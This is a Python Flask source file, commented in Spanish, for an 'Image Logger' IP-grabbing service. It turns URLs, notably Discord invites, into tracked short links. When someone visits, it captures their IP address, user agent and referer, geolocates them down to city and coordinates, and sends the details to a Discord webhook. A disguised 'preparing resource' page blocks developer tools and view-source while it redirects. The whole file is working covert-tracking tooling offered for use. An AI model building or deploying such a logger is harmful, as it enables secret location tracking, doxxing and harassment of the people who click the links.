import os
import json
import uuid
import requests
from datetime import datetime
from urllib.parse import urlparse
from threading import Thread

from flask import Flask, request, jsonify, abort, render_template_string
from user_agents import parse as ua_parse

# ============================================================================
# CONFIGURACIÓN VERCEL
# ============================================================================
app = Flask(__name__)

PUBLIC_BASE = os.environ.get('PUBLIC_BASE', 'http://localhost:5000').rstrip('/')
HOOK_TOKEN = os.environ.get('HOOK_TOKEN')
DISCORD_WEBHOOK = os.environ.get('DISCORD_WEBHOOK')
INTERSTITIAL_DELAY = int(os.environ.get('INTERSTITIAL_DELAY', '5'))
APPEND_WHITELIST = [s.strip() for s in os.environ.get('APPEND_WHITELIST', 'github.com,example.com').split(',') if s.strip()]

# 📦 ALMACENAMIENTO EN MEMORIA (Vercel)
STORE = {"redirects": {}}

# ============================================================================
# FUNCIONES AUXILIARES
# ============================================================================

def make_slug():
    """Generar slug único de 10 caracteres"""
    return uuid.uuid4().hex[:10]

def is_whitelisted_for_append(url):
    """Verificar si URL está en whitelist para append"""
    try:
        u = urlparse(url)
        host = (u.hostname or '').lower()
        return any(host.endswith(w.lower()) for w in APPEND_WHITELIST)
    except Exception:
        return False

def is_discord_invite(url):
    """Detectar si es invite de Discord"""
    try:
        u = urlparse(url)
        host = (u.hostname or '').lower()
        path = (u.path or '').lower()
        if host.endswith('discord.gg'):
            return True
        if 'discord.com' in host and '/invite' in path:
            return True
    except Exception:
        pass
    return False

def geoip_lookup(ip):
    """GeoIP lookup usando ip-api.com (free)"""
    try:
        r = requests.get(
            f"http://ip-api.com/json/{ip}?fields=status,message,country,regionName,city,lat,lon,isp,as,timezone,proxy,mobile,query",
            timeout=6
        )
        if r.ok:
            j = r.json()
            if j.get('status') == 'success':
                return {
                    "ip": j.get('query'),
                    "provider": j.get('isp'),
                    "asn": j.get('as'),
                    "country": j.get('country'),
                    "region": j.get('regionName'),
                    "city": j.get('city'),
                    "lat": j.get('lat'),
                    "lon": j.get('lon'),
                    "timezone": j.get('timezone'),
                    "mobile": j.get('mobile'),
                    "proxy": j.get('proxy'),
                }
            else:
                return {"ip": ip, "error": j.get('message')}
    except Exception as e:
        return {"ip": ip, "error": str(e)}
    return {"ip": ip, "error": "lookup_failed"}

def detect_ua_info(user_agent):
    """Detectar info del User-Agent"""
    ua = ua_parse(user_agent or "")
    browser = f"{ua.browser.family} {ua.browser.version_string}".strip()
    os_str = f"{ua.os.family} {ua.os.version_string}".strip()
    return {
        "is_mobile": ua.is_mobile,
        "is_bot": ua.is_bot,
        "browser": browser,
        "os": os_str,
        "ua_string": user_agent
    }

def send_discord_embed(hit, geo, ua_info, original_url=None):
    """Enviar embed a Discord webhook"""
    if not DISCORD_WEBHOOK:
        return

    try:
        ip_info_value = f"**IP:** {geo.get('ip', 'N/A')}\n**Provider:** {geo.get('provider', 'N/A')}\n**ASN:** {geo.get('asn', 'N/A')}\n**Country:** {geo.get('country', 'N/A')}\n**Region:** {geo.get('region', 'N/A')}\n**City:** {geo.get('city', 'N/A')}"
        
        pc_info = f"**OS:** {ua_info.get('os', 'N/A')}\n**Browser:** {ua_info.get('browser', 'N/A')}\n**Mobile:** {ua_info.get('is_mobile')}\n**Bot:** {ua_info.get('is_bot')}"
        
        ua_block = ua_info.get('ua_string', '')[:500] or ''

        embed = {
            "title": "🎯 Image Logger — IP Captured",
            "description": f"Endpoint: {hit.get('endpoint')} — Captured: {hit.get('received_at')}\nResource: {hit.get('resource_name', '')}\nOriginal: {original_url or ''}",
            "color": 0x2ECC71,
            "fields": [
                {"name": "IP Info", "value": ip_info_value, "inline": False},
                {"name": "Client", "value": pc_info, "inline": False},
                {"name": "User Agent", "value": f"```{ua_block}```", "inline": False},
            ],
            "timestamp": datetime.utcnow().isoformat()
        }

        payload = {"embeds": [embed], "username": "Image-Logger"}
        requests.post(DISCORD_WEBHOOK, json=payload, timeout=8)
    except Exception as e:
        print(f"Error sending Discord embed: {e}")

# ============================================================================
# TEMPLATE HTML (Página intersticial)
# ============================================================================

INTERSTITIAL_TEMPLATE = """
<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <title>Preparing resource...</title>
  <meta name="viewport" content="width=device-width,initial-scale=1">
  <meta http-equiv="X-Content-Type-Options" content="nosniff">
  <meta http-equiv="X-Frame-Options" content="DENY">
  <meta name="referrer" content="no-referrer">
  <style>
    body { background:#0b0f14; color:#e6eef6; font-family:Helvetica,Arial,sans-serif; display:flex; align-items:center; justify-content:center; height:100vh; margin:0; }
    .card { width:94%; max-width:760px; background:#1b2228; padding:20px; border-radius:8px; box-shadow:0 8px 30px rgba(0,0,0,0.6); border-left:6px solid #1dd1a1; }
    h1 { margin:0 0 6px; font-size:20px; }
    p { margin:6px 0; color:#cbd5df; }
    .count { font-size:56px; color:#1dd1a1; text-align:center; margin:14px 0; font-weight:700; }
    .small { font-size:13px; color:#9fb0bd; }
    .orig { margin-top:12px; word-break:break-all; color:#9fb0bd; font-size:14px; }
    .note { margin-top:8px; font-size:12px; color:#93a7b5; }
    .orig a { pointer-events: none; color:#9fb0bd; text-decoration:none; }
  </style>
</head>
<body>
  <div class="card" role="status" aria-live="polite">
    <h1>Preparing resource — please wait</h1>
    <p class="small">Por seguridad, estamos preparando el recurso. Serás redirigido automáticamente en breve.</p>
    <div class="count" id="count">{{ delay }}</div>
    <p class="small">Endpoint: {{ endpoint }} — Capturado: {{ received_at }}</p>
    <div class="orig"><strong>Destino:</strong><br><span id="origText">{{ original_url }}</span></div>
    <p class="note">No es posible omitir esta espera. Si necesitas abrir el enlace ahora, copia manualmente la URL indicada arriba.</p>
  </div>

  <script>
    window.addEventListener('contextmenu', function(e){ e.preventDefault(); }, {capture: true});
    window.addEventListener('keydown', function(e){
      if ((e.ctrlKey || e.metaKey) && (e.key === 't' || e.key === 'T' || e.key === 'u' || e.key === 'U' || (e.shiftKey && (e.key === 'I' || e.key === 'i')))) {
        e.preventDefault(); e.stopPropagation();
      }
      if (e.key === 'F12') { e.preventDefault(); e.stopPropagation(); }
    }, {capture:true});

    (function(){
      var t = {{ delay }};
      var el = document.getElementById('count');
      var orig = "{{ original_url }}";
      var meta = document.createElement('meta');
      meta.httpEquiv = "refresh";
      meta.content = "{{ delay_plus_one }};url=" + orig;
      document.getElementsByTagName('head')[0].appendChild(meta);

      var timer = setInterval(function(){
        t -= 1;
        el.textContent = t;
        if(t <= 0) {
          clearInterval(timer);
          window.location.replace(orig);
        }
      }, 1000);
    })();
  </script>
</body>
</html>
"""

# ============================================================================
# ENDPOINTS
# ============================================================================

@app.route('/convert', methods=['POST'])
def convert():
    """Convertir URL a short link o append URL"""
    # 🔐 Autenticación
    if HOOK_TOKEN:
        token = request.headers.get('x-hook-token') or request.headers.get('authorization')
        if not token or token != HOOK_TOKEN:
            return jsonify({"error": "unauthorized"}), 401

    data = request.get_json(force=True) or {}
    url = data.get('url')
    prefer = data.get('prefer', 'auto')
    resource_name = data.get('name') or ''

    if not url:
        return jsonify({"error": "missing url"}), 400

    # Discord invites siempre usan redirect
    if is_discord_invite(url):
        prefer = 'redirect'

    # Decidir entre append o redirect
    if prefer == 'append' or (prefer == 'auto' and is_whitelisted_for_append(url)):
        # Modo append: no cambiar dominio
        sep = '&' if '?' in url else '?'
        appended = f"{url}{sep}orig=1"
        return jsonify({"mode": "append", "appended_url": appended}), 200
    else:
        # Modo redirect: crear short link
        slug = make_slug()
        STORE['redirects'][slug] = {
            "url": url,
            "created_at": datetime.utcnow().isoformat(),
            "resource_name": resource_name,
            "hits": []
        }
        short = f"{PUBLIC_BASE}/r/{slug}"
        return jsonify({"mode": "redirect", "short_url": short, "slug": slug}), 201


@app.route('/r/<slug>', methods=['GET'])
def tracked_redirect(slug):
    """Redireccionamiento tracked con captura de IP/UA/Referer"""
    if slug not in STORE.get('redirects', {}):
        return abort(404)

    entry = STORE['redirects'][slug]
    
    # 📊 Capturar información del visitante
    ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0].strip()
    ua = request.headers.get('User-Agent', '')
    referer = request.headers.get('Referer', '')
    received_at = datetime.utcnow().isoformat()

    hit = {
        "slug": slug,
        "ip": ip,
        "user_agent": ua,
        "referer": referer,
        "received_at": received_at,
        "endpoint": f"/r/{slug}",
        "resource_name": entry.get('resource_name', ''),
        "original_url": entry.get('url')
    }

    # 🔍 GeoIP y User-Agent detection
    geo = geoip_lookup(ip)
    ua_info = detect_ua_info(ua)

    # 🔔 Enviar a Discord (sin bloquear)
    def notify_discord():
        send_discord_embed(hit, geo, ua_info, original_url=entry.get('url'))

    try:
        Thread(target=notify_discord, daemon=True).start()
    except Exception:
        pass

    # 💾 Guardar hit
    entry['hits'].append({
        "ip": ip,
        "ua": ua,
        "referer": referer,
        "at": received_at
    })

    # 🌐 Retornar página intersticial
    html = render_template_string(
        INTERSTITIAL_TEMPLATE,
        endpoint=f"/r/{slug}",
        received_at=received_at,
        original_url=entry.get('url'),
        delay=INTERSTITIAL_DELAY,
        delay_plus_one=INTERSTITIAL_DELAY + 1
    )
    return html, 200, {'Content-Type': 'text/html; charset=utf-8'}


@app.route('/health', methods=['GET'])
def health():
    """Health check para Vercel"""
    return jsonify({
        "status": "ok",
        "public_base": PUBLIC_BASE,
        "total_links": len(STORE.get('redirects', {}))
    }), 200


@app.route('/stats', methods=['GET'])
def stats():
    """Estadísticas de debug (solo si hay HOOK_TOKEN)"""
    if HOOK_TOKEN:
        token = request.headers.get('x-hook-token') or request.headers.get('authorization')
        if not token or token != HOOK_TOKEN:
            return jsonify({"error": "unauthorized"}), 401

    total_redirects = len(STORE.get('redirects', {}))
    total_hits = sum(len(entry.get('hits', [])) for entry in STORE.get('redirects', {}).values())
    
    return jsonify({
        "total_short_links": total_redirects,
        "total_clicks": total_hits,
        "redirects": STORE.get('redirects', {})
    }), 200


if __name__ == '__main__':
    port = int(os.environ.get('PORT', '5000'))
    app.run(host='0.0.0.0', port=port, debug=False)
